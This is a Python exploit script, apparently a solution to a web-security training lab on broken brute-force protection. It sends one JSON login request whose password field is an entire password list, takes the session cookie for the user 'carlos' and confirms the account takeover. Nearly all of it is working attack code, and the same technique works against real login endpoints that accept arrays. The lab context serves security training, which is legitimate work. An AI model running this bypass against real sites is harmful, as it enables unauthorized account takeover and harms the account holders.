###########################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 30/8/2023
#
# Lab: Broken brute-force protection, multiple credentials per request
#
# Steps: 1. Send multiple passwords in the same login request
#        2. Obtain the new session from cookie header
#        3. Login as carlos with the new session
#
###########################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a140042031fd925821fbf7d00bf000c.web-security-academy.net"

# change the file path of the password list
passwords = open("/home/ahmed/passwords", 'rt').read().splitlines()

# set data to send via POST
json = {
    "username": "carlos",
    "password": passwords
}

try:    
    # send multiple passwords in one request
    res = requests.post(f"{url}/login", json=json, allow_redirects=False)
    
except:
    print(Fore.RED + "Failed to send login request through exception")
    exit(1)

print(Fore.WHITE + "[*] Sending multiple credentials in the same request.. OK")

# if login is successful, a redirect will occur
if res.status_code == 302:  
    # extract session form the cookie header
    session = res.cookies.get("session")
    
    # set session cookie
    headers = {
        "Cookie": f"session={session}"
    }

    try:
        # get the home page with obtained session
        home = requests.get(f"{url}/my-account?id=carlos", headers=headers)
        
    except:
        print(Fore.RED + "Failed to fetch the home page through exception")
        exit(1)

    # search for a pattern to make sure you logged in as carlos
    is_carlos = re.findall("Your username is: carlos", home.text)
    
    # if the patter is found
    if len(is_carlos) != 0:  
        print(Fore.WHITE + "✅ Successfully logged in as " + Fore.GREEN + "carlos")
        print(Fore.WHITE + "[#] Use this " + Fore.GREEN + session + Fore.WHITE + " session in your browser to login as carlos")
    
    else:
        print(Fore.RED + "Failed to login")

else:
    print(Fore.RED + "Failed to login")

